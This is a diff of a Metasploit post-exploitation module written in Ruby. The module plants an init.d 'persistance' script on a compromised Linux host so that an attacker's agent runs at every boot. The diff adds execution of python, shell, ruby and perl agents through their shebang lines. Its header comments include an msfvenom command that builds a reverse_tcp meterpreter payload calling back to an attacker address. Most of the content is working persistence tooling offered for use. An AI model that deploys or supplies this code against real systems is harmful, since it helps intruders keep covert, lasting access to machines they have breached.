@@ -15,24 +15,35 @@
 # [ DESCRIPTION ]
 # Builds 'persistance' init.d startup script that allow users to
 # persiste your binary (executable) on Linux distros at every startup.
-# HINT: This post-module accepts any 'linux' chmoded payloads (sh|py|rb|etc..)
-# HINT: This post-module requires the payload allready deployed on target system.
+# HINT: This post-module accepts any 'linux' chmoded agents (elf|sh|py|rb|empty)
+# HINT: This post-module requires the agent allready deployed on target system.
 # HINT: In Kali distos we are 'root' by default, so this post module does
 # not required privilege escalation in systems were we are allready root ..
 #
 #
 # [ MODULE OPTIONS ]
 # The session number to run this module on           => set SESSION 3
-# The full remote path of binary to execute (remote) => set REMOTE_PATH /root/payload
+# The full remote path of binary to execute (remote) => set REMOTE_PATH /root/agent
+# Time to wait for the agent to start   (in seconds) => set START_TIME 15
 # The full remote path of init.d directory  (remote) => set INIT_PATH /etc/init.d
 # Delete persistence script/configurations  (remote) => set DEL_PERSISTENCE true
-# Time to wait for the agent to start, in seconds    => set START_TIME 15
+# Use agents with [shebang]? (eg #!/usr/bin/python)  => set SHEBANG true
+# ---
+# If sellected 'SHEBANG true' then agent execution will be based on is shebang
+# EXAMPLE: #!/bin/sh agents will be executed         : sh /root/agent.sh
+# EXAMPLE: #!/usr/bin/python agents will be executed : python /root/agent.py
+# HINT: Rename your agent name to 'agent' when using 'SHEBANG true' option ..
+# ---
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
 # Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/linux/manage/kali_initd_persistence.rb
 # Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/linux/manage/kali_initd_persistence.rb
 # Manually Path Search: root@kali:~# locate modules/post/linux/manage
+#
+#
+# [ BUILD AGENT TO TEST (without-shebang) ]
+# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f elf -o agent.elf
 #
 #
 # [ LOAD/USE AUXILIARY ]
@@ -85,7 +96,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'Linux Kali init.d persistence post-module',
                         'Description'   => %q{
-                                        Builds 'persistance' init.d startup script that allow users to persiste your binary (executable) on Linux distros at every startup. This post-module requires the payload allready deployed on target system and accepts any 'linux' chmoded payloads (sh|py|rb|etc) to be auto-executed at startup.
+                                        Builds 'persistance' init.d startup script that allow users to persiste your agent (executable) on Linux distros at every startup. This post-module requires the agent allready deployed on target system and accepts any 'linux' chmoded agents (elf|sh|py|rb|pl) to be auto-executed at startup. This module will also accepts shebang agents (eg #!/usr/bin/python).
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -93,7 +104,7 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                 ],
  
-                        'Version'        => '$Revision: 1.4',
+                        'Version'        => '$Revision: 1.5',
                         'DisclosureDate' => 'jun 1 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
@@ -113,8 +124,8 @@ class MetasploitModule < Msf::Post
 			'DefaultOptions' =>
 				{
                                          'SESSION' => '1',             # Default its to run againts session 1
-                                         'INIT_PATH' => '/etc/init.d', # Default init.d directory full path
-                                         'START_TIME' => '10',         # Default time (sec) to start remote agent
+                                         'START_TIME' => '8',          # Default time (sec) to start remote agent
+                                         'INIT_PATH' => '/etc/init.d', # Default init.d remote directory full path
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
  
@@ -123,14 +134,15 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
-                                OptString.new('REMOTE_PATH', [ false, 'The full remote path of binary to execute (eg /root/payload)'])
+                                OptString.new('START_TIME', [ false, 'Time to wait for the agent to start (in seconds)']),
+                                OptString.new('REMOTE_PATH', [ false, 'The full remote path of binary to execute (eg /root/agent)'])
                         ], self.class)
 
                 register_advanced_options(
                         [
-                                OptString.new('START_TIME', [ false, 'Time to wait for the agent to start, in seconds']),
-                                OptString.new('INIT_PATH', [ false, 'The full remote path of init.d directory (eg /etc/init.d)']),
-                                OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence script/configurations?' , false])
+                                OptBool.new('SHEBANG', [ false, 'Use agents with [shebang]? (eg #!/bin/sh)' , false]),
+                                OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence script/configurations?' , false]),
+                                OptString.new('INIT_PATH', [ false, 'The full remote path of init.d directory (eg /etc/init.d)'])
                         ], self.class) 
 
         end
@@ -146,7 +158,7 @@ def ls_stage1
   rem = session.sys.config.sysinfo
   init = datastore['INIT_PATH']          # /etc/init.d
   stime = datastore['START_TIME']        # 10 (sec to start the agent)
-  remote_path = datastore['REMOTE_PATH'] # /root/payload
+  remote_path = datastore['REMOTE_PATH'] # /root/agent
   script_check = "#{init}/persistance"   # /etc/init.d/persistance
   #
   # check for proper config settings enter
@@ -160,7 +172,6 @@ def ls_stage1
     print_status("Persist #{remote_path} agent ..")
     Rex::sleep(1.0)
   end
-
 
     #
     # Check if persistence its allready active ..
@@ -183,6 +194,44 @@ def ls_stage1
     end
     print_status("Remote agent full path found ..")
 
+    #
+    # Sellect how agent will execute (in persistence script call)
+    #
+    if datastore['SHEBANG'] == true
+      #
+      # If used agents with SHEBANG (eg #!/usr/bin/python)
+      # TODO: Check Extensions execution using bash ( elf | sh | py | rb | pl ) 
+      #
+      if remote_path =~ /.elf/
+        print_status("Agent extension sellected: .elf")
+        trigger = "."
+      elsif remote_path =~ /.sh/
+        print_status("Agent extension sellected: bash")
+        trigger = "sh "
+      elsif remote_path =~ /.py/
+        print_status("Agent extension sellected: python")
+        trigger = "python "
+      elsif remote_path =~ /.rb/
+        print_status("Agent extension sellected: ruby")
+        trigger = "ruby "
+      elsif remote_path =~ /.pl/
+        print_status("Agent extension sellected: perl")
+        trigger = "perl "
+      else
+        print_error("Agent extension not supported ..")
+        print_error("Please use [sh|elf|py|rb|pl] agent extensions ..")
+        print_error("OR set 'SHELBANG false' to execute agent: ./root/agent")
+        print_line("")
+        return nil
+      end
+    #
+    # WITHOUTH-SHEBANG-AGENTS-EXECUTION (most of venom v1.0.13 builds)
+    # Default way to execute one agent shelbang free: ./root/agent
+    #
+    else
+      trigger = "."
+    end
+
       #
       # This is the init.d script that provides persistence on startup ..
       #
@@ -196,12 +245,12 @@ def ls_stage1
         f.write("# Required-Stop:     $remote_fs $local_fs\n")
         f.write("# Default-Start:     2 3 4 5\n")
         f.write("# Default-Stop:      0 1 6\n")
-        f.write("# Short-Description: Persiste your binary (elf) in kali linux.\n")
+        f.write("# Short-Description: Persiste your agent in kali linux distros.\n")
         f.write("# Description:       Allows users to persiste your binary (elf) in kali linux systems\n")
         f.write("### END INIT INFO\n\n")
-        f.write("# Give a little time to execute elf agent\n")
+        f.write("# Give a little time to execute agent\n")
         f.write("sleep #{stime} > /dev/null\n")
-        f.write(".#{remote_path}")
+        f.write("#{trigger}#{remote_path}")
         f.close
       end
       print_good("Service path: #{script_check}")
@@ -215,7 +264,8 @@ def ls_stage1
         cmd_exec("chmod +x #{script_check}")
         Rex::sleep(1.0)
         print_good("Update init.d service status (symlinks) ..")
-        cmd_exec("update-rc.d persistance defaults # 97 03")
+        # update-rc.d persistance defaults # 97 03
+        cmd_exec("update-rc.d persistance defaults")
         Rex::sleep(1.0)
       else
         print_error("init.d script: #{script_check} not found ..")
@@ -269,6 +319,7 @@ def ls_stage2
     #
     if not session.fs.file.exist?(script_check)
       print_error("script: #{script_check} not found ..")
+      print_error("Post-module reports that none persistence was found ..")
       print_line("")
       return nil
     end
@@ -299,7 +350,7 @@ def ls_stage2
     # Final displays to user ..
     #
     print_status("Persistence deleted from: #{rem['Computer']}")
-    print_warning("This module will NOT delete the binary from target ..")
+    print_warning("This module will NOT delete the agent from target ..")
     Rex::sleep(1.0)
     print_line("")
 
@@ -314,10 +365,10 @@ end
 
 
 
-# ------------------------------------------------
+#
 # MAIN DISPLAY WINDOWS (ALL MODULES - def run)
 # Running sellected modules against session target
-# ------------------------------------------------
+#
 def run
   session = client
 
@@ -348,6 +399,7 @@ def run
     # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
     #
     # check for proper operative system (Linux)
+    #
     if not sysinfo['OS'] =~ /Linux/
       print_error("[ ABORT ]: This module only works againt Linux systems")
       return nil
